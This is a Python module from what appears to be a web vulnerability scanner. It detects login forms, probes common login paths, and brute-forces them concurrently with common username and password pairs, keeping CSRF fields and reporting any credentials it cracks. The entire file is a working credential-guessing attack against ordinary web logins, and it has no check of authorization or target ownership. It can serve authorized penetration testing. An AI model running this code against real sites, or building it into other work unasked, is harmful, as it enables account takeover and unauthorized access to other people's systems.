"""
src/modules/bruteforce.py — Login Form Attack Module

Strategy:
  1. Auto-detect login forms from result.forms (harvested by forms.py)
  2. Fingerprint success/failure indicators from a known-bad attempt
  3. Try common credential pairs with configurable concurrency
  4. Detect lockout / rate-limiting / CAPTCHA and abort gracefully
  5. Report cracked credentials immediately in rich UI
"""

from __future__ import annotations

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

from rich.markup import escape
from rich.panel import Panel
from rich.rule import Rule
from rich.table import Table

from src.config import SESSION, console
from src.models import ScanResult
from src.wordlists.credentials import COMMON_USERS, COMMON_PASSWORDS
from src.scoring import score_and_report

# ─────────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────────

_BRUTE_WORKERS: int = 10  # concurrent threads per form
_BRUTE_DELAY: float = 0.3  # delay between attempts (seconds) — polite
_LOCKOUT_THRESHOLD: int = 5  # consecutive 429s before declaring lockout
_MAX_PAIRS: int = 500  # hard cap to prevent endless runs

# Keywords that typically appear in failed login responses
_FAILURE_KEYWORDS = [
    "invalid",
    "incorrect",
    "wrong",
    "failed",
    "error",
    "denied",
    "unauthorized",
    "bad credentials",
    "try again",
    "not found",
    "tidak valid",
    "salah",
    "gagal",
]

# Keywords that typically appear in successful login responses
_SUCCESS_KEYWORDS = [
    "dashboard",
    "logout",
    "welcome",
    "profile",
    "account",
    "sign out",
    "log out",
    "my account",
    "settings",
    "beranda",
    "logout",
    "keluar",
]

# Login-related URL path hints
_LOGIN_PATH_HINTS = [
    "login",
    "signin",
    "sign-in",
    "log-in",
    "auth",
    "account",
    "session",
    "user/login",
    "admin/login",
    "wp-login",
    "masuk",
]

# Common field name patterns for username / password inputs
_USER_FIELD_NAMES = {
    "username",
    "user",
    "email",
    "login",
    "name",
    "account",
    "uname",
    "userid",
    "user_id",
    "user_email",
    "identifier",
}
_PASS_FIELD_NAMES = {
    "password",
    "pass",
    "passwd",
    "pwd",
    "secret",
    "passphrase",
}


# ─────────────────────────────────────────────────────────────────
# 1. Form Scanner — find login forms
# ─────────────────────────────────────────────────────────────────


def _is_login_form(form: dict) -> bool:
    """Return True if a form looks like a login form."""
    action = (form.get("action") or "").lower()
    inputs = form.get("inputs", [])
    input_names = {(i.get("name") or "").lower() for i in inputs}
    input_types = {(i.get("type") or "").lower() for i in inputs}

    # Must have a password field
    has_password = "password" in input_types or bool(input_names & _PASS_FIELD_NAMES)
    if not has_password:
        return False

    # Has a username-like text/email field
    has_user = (
        bool(input_names & _USER_FIELD_NAMES)
        or "email" in input_types
        or "text" in input_types
    )

    # Action URL contains a login hint
    action_hint = any(h in action for h in _LOGIN_PATH_HINTS)

    return has_password and (has_user or action_hint)


def _auto_detect_login_forms(result: ScanResult, target_url: str) -> list[dict]:
    """
    Collect login forms from:
      - result.forms (harvested by forms.py)
      - Common login paths if no forms found
    """
    login_forms: list[dict] = []

    # 1. Check harvested forms
    for form in getattr(result, "forms", []):
        if _is_login_form(form):
            login_forms.append(form)

    # 2. Fallback: probe common paths
    if not login_forms:
        for path in [
            "/login",
            "/signin",
            "/wp-login.php",
            "/admin/login",
            "/user/login",
            "/auth/login",
            "/account/login",
        ]:
            url = urljoin(target_url, path)
            try:
                r = SESSION.get(url, timeout=6, allow_redirects=True)
                if r.status_code == 200 and "<form" in r.text.lower():
                    # Synthesize a minimal form dict so downstream code works
                    login_forms.append(
                        {
                            "action": url,
                            "method": "POST",
                            "form_num": 0,
                            "inputs": [],  # will be guessed by _build_payload
                            "_raw_html": r.text,
                            "_url": url,
                        }
                    )
            except Exception:
                pass

    return login_forms


# ─────────────────────────────────────────────────────────────────
# 2. Fingerprint success / failure
# ─────────────────────────────────────────────────────────────────


def _get_failure_baseline(
    action_url: str, user_field: str, pass_field: str, extra_fields: dict
) -> dict:
    """
    Submit a deliberately wrong credential to learn what a failed login looks
    like (status code, redirect URL, response length, keywords).
    """
    baseline: dict = {
        "status": None,
        "length": None,
        "redirect_url": None,
        "failure_keywords": [],
    }
    try:
        payload = {
            user_field: "definitely_not_a_real_user_kv@kv.kv",
            pass_field: "kVanguard_INVALID_PASSWORD_!@#",
            **extra_fields,
        }
        r = SESSION.post(action_url, data=payload, timeout=8, allow_redirects=True)
        baseline["status"] = r.status_code
        baseline["length"] = len(r.text)
        baseline["redirect_url"] = r.url

        text_lower = r.text.lower()
        for kw in _FAILURE_KEYWORDS:
            if kw in text_lower:
                baseline["failure_keywords"].append(kw)
    except Exception:
        pass

    return baseline


def _is_success(response, baseline: dict) -> bool:
    """Determine if a response indicates a successful login."""
    # Check redirect — login usually redirects to dashboard, not back to /login
    if response.url != baseline.get("redirect_url"):
        # Redirected to somewhere different → promising
        redirected_to = response.url.lower()
        if any(
            kw in redirected_to
            for kw in _SUCCESS_KEYWORDS + ["dashboard", "home", "panel"]
        ):
            return True
        # Redirected away from login page
        if not any(h in redirected_to for h in _LOGIN_PATH_HINTS):
            return True

    # Check success keywords in body
    text_lower = response.text.lower()
    if any(kw in text_lower for kw in _SUCCESS_KEYWORDS):
        return True

    # Check failure keywords — if they're ABSENT and status is 200, likely success
    if response.status_code == 200:
        failure_present = any(kw in text_lower for kw in _FAILURE_KEYWORDS)
        if not failure_present and len(response.text) != baseline.get("length"):
            return True

    return False


# ─────────────────────────────────────────────────────────────────
# 3. Field guesser
# ─────────────────────────────────────────────────────────────────


def _resolve_fields(form: dict) -> tuple[str, str, dict]:
    """
    Return (user_field_name, pass_field_name, extra_hidden_fields).
    Falls back to generic guesses if forms.py didn't harvest inputs.
    """
    inputs = form.get("inputs", [])
    user_field = "username"
    pass_field = "password"
    extra: dict = {}

    for inp in inputs:
        name = (inp.get("name") or "").lower()
        itype = (inp.get("type") or "text").lower()
        value = inp.get("value") or ""

        if itype == "hidden" and name:
            extra[inp["name"]] = value  # CSRF tokens, etc.
        elif itype == "password":
            pass_field = inp["name"]
        elif itype in ("text", "email") and name in _USER_FIELD_NAMES:
            user_field = inp["name"]
        elif itype in ("text", "email") and not name.startswith("search"):
            user_field = inp["name"]  # best guess

    return user_field, pass_field, extra


# ─────────────────────────────────────────────────────────────────
# 4. Core attack engine
# ─────────────────────────────────────────────────────────────────


def _attack_form(
    form: dict,
    target_url: str,
    progress,
    task,
) -> list[dict]:
    """
    Attempt credential pairs against a single login form.
    Returns list of cracked credentials.
    """
    action = form.get("action") or target_url
    if not action.startswith("http"):
        action = urljoin(target_url, action)

    user_field, pass_field, extra_fields = _resolve_fields(form)

    progress.update(
        task,
        description=f"[cyan]BruteForce:[/cyan] Fingerprinting failure baseline → {action[:60]}…",
    )
    baseline = _get_failure_baseline(action, user_field, pass_field, extra_fields)

    if baseline["status"] is None:
        return []

    # Build credential pairs
    pairs: list[tuple[str, str]] = []
    for user in COMMON_USERS:
        for pwd in COMMON_PASSWORDS:
            pairs.append((user, pwd))
            if len(pairs) >= _MAX_PAIRS:
                break
        if len(pairs) >= _MAX_PAIRS:
            break

    cracked: list[dict] = []
    consecutive_429 = 0
    attempt_num = 0

    def _try_cred(pair: tuple[str, str]) -> dict | None:
        user, pwd = pair
        payload = {user_field: user, pass_field: pwd, **extra_fields}
        try:
            r = SESSION.post(action, data=payload, timeout=8, allow_redirects=True)

            if r.status_code == 429:
                return {"lockout": True, "user": user, "pwd": pwd}

            if r.status_code in (403, 503):
                return {"waf_block": True}

            if _is_success(r, baseline):
                return {
                    "cracked": True,
                    "username": user,
                    "password": pwd,
                    "status": r.status_code,
                    "redirect": r.url,
                    "form_action": action,
                }
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=_BRUTE_WORKERS) as pool:
        futures = {pool.submit(_try_cred, pair): pair for pair in pairs}

        for fut in as_completed(futures):
            attempt_num += 1
            res = fut.result()

            if res is None:
                consecutive_429 = 0
                time.sleep(_BRUTE_DELAY)
                continue

            if res.get("lockout"):
                consecutive_429 += 1
                if consecutive_429 >= _LOCKOUT_THRESHOLD:
                    progress.update(
                        task,
                        description=f"[yellow]BruteForce:[/yellow] Account lockout detected after {attempt_num} attempts — aborting.",
                    )
                    pool.shutdown(wait=False, cancel_futures=True)
                    break

            elif res.get("waf_block"):
                progress.update(
                    task,
                    description="[yellow]BruteForce:[/yellow] WAF/403 detected — slowing down…",
                )
                time.sleep(2)

            elif res.get("cracked"):
                cracked.append(res)
                progress.update(
                    task,
                    description=f"[bold red blink]💀 CRACKED: {res['username']} : {res['password']}[/bold red blink]",
                )
                progress.console.print(
                    Panel(
                        f"[bold red]🔓 CREDENTIAL CRACKED![/bold red]\n\n"
                        f"  [bold]Form URL  :[/bold] [cyan]{action}[/cyan]\n"
                        f"  [bold]Username  :[/bold] [yellow]{res['username']}[/yellow]\n"
                        f"  [bold]Password  :[/bold] [bold red]{res['password']}[/bold red]\n"
                        f"  [bold]Redirected:[/bold] {res['redirect']}",
                        title="[bold red blink]☠ BRUTEFORCE SUCCESS[/bold red blink]",
                        border_style="red",
                    )
                )
            else:
                consecutive_429 = 0

            progress.update(
                task,
                description=f"[cyan]BruteForce:[/cyan] {attempt_num}/{len(pairs)} attempts — {len(cracked)} cracked…",
            )

    return cracked


# ─────────────────────────────────────────────────────────────────
# Module entry point
# ─────────────────────────────────────────────────────────────────


def run_bruteforce(
    target_url: str, hostname: str, result: ScanResult, progress, task
) -> None:
    """
    Detect login forms and attempt credential attacks.
    Stores results in result.bruteforce_findings.
    """
    progress.update(
        task, description="[cyan]BruteForce:[/cyan] Scanning for login forms…"
    )

    login_forms = _auto_detect_login_forms(result, target_url)

    if not login_forms:
        result.bruteforce_findings = {
            "status": "no_forms",
            "reason": "No login forms detected on target.",
            "cracked": [],
            "forms_tested": 0,
        }
        progress.update(task, completed=100)
        return

    progress.update(
        task,
        description=f"[cyan]BruteForce:[/cyan] Found {len(login_forms)} login form(s). Starting credential attack…",
    )

    all_cracked: list[dict] = []
    for i, form in enumerate(login_forms):
        action = form.get("action") or target_url
        progress.update(
            task,
            description=f"[cyan]BruteForce:[/cyan] Attacking form {i + 1}/{len(login_forms)} → {action[:60]}…",
        )
        cracked = _attack_form(form, target_url, progress, task)
        all_cracked.extend(cracked)

    result.bruteforce_findings = {
        "status": "cracked" if all_cracked else "secure",
        "forms_tested": len(login_forms),
        "cracked": all_cracked,
    }
    progress.update(task, completed=100)
    score_and_report(result, "bruteforce")


# ─────────────────────────────────────────────────────────────────
# Display function
# ─────────────────────────────────────────────────────────────────


def score_bruteforce(result):
    findings = result.bruteforce_findings
    if not findings:
        return 100
    if isinstance(findings, dict) and findings.get("cracked"):
        return max(0, 100 - len(findings.get("cracked", [])) * 30)
    return 100


def display_bruteforce(result: ScanResult) -> None:
    findings = getattr(result, "bruteforce_findings", {})
    if not findings:
        return

    console.print(Rule("[bold red]🔑   LOGIN FORM BRUTE FORCE[/bold red]", style="red"))

    status = findings.get("status")
    cracked = findings.get("cracked", [])
    forms_tested = findings.get("forms_tested", 0)

    if status == "no_forms":
        console.print(
            f"  [dim]No login forms detected. {findings.get('reason', '')}[/dim]\n"
        )
        return

    console.print(f"  Forms tested: [cyan]{forms_tested}[/cyan]")
    console.print(f"  Credentials cracked: [bold red]{len(cracked)}[/bold red]\n")

    if not cracked:
        console.print(
            "  [green]✅ No credentials cracked. Target appears brute-force resistant.[/green]\n"
        )
        return

    tbl = Table(
        "Form URL",
        "Username",
        "Password",
        "Redirect",
        header_style="bold red",
        border_style="red",
        show_lines=True,
    )
    for c in cracked:
        tbl.add_row(
            escape(c.get("form_action", "?")[:60]),
            f"[yellow]{escape(c.get('username', '?'))}[/yellow]",
            f"[bold red]{escape(c.get('password', '?'))}[/bold red]",
            escape(c.get("redirect", "?")[:50]),
        )
    console.print(tbl)
    console.print()


def export_bruteforce(result: ScanResult, W: callable) -> None:
    if result.bruteforce_findings:
        W("## 🔓 Brute-force Findings\n\n")
        for k, v in result.bruteforce_findings.items():
            W(f"- **{k}**: {v}\n")
        W("\n")
